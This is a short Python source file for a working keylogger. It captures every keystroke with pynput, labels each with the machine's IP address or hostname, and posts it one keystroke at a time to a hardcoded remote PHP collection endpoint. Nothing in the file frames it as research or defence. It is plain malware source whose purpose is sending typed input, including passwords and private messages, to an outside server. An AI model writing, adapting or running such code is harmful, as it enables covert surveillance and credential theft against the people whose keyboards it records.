from pynput.keyboard import Key, Listener
import requests
import socket

# Function to get the local IPv4 address
def get_ipv4():
    try:
        return socket.gethostbyname(socket.gethostname())
    except socket.error:
        return None

# Function to get the local IPv6 address
def get_ipv6():
    try:
        ipv6_info = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)
        return ipv6_info[0][4][0]  # Return the first IPv6 address found
    except socket.error:
        return None

# Function to get the system name
def get_system_name():
    return socket.gethostname()

# Get the IP address or system name
local_ip = get_ipv4() or get_ipv6() or get_system_name()
# Replace dots in IP for filename (only if it's IPv4)
if '.' in local_ip:
    local_ip = local_ip.replace('.', '_')

# Your server URL
server_url = "https://gagandevraj.com/keylogs/keylog_server.php"

# Function to send keystrokes to the server
def send_to_server(key_data):
    try:
        requests.post(server_url, data={'key': key_data, 'identifier': local_ip})
    except Exception as e:
        print(f"Failed to send data to server: {e}")

# Function to handle key press
def on_press(key):
    try:
        send_to_server(str(key.char))
    except AttributeError:
        if key == Key.space:
            send_to_server(' ')
        elif key == Key.enter:
            send_to_server('\n')
        else:
            send_to_server(f' [{key}] ')

# Function to stop the keylogger on 'esc' key
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
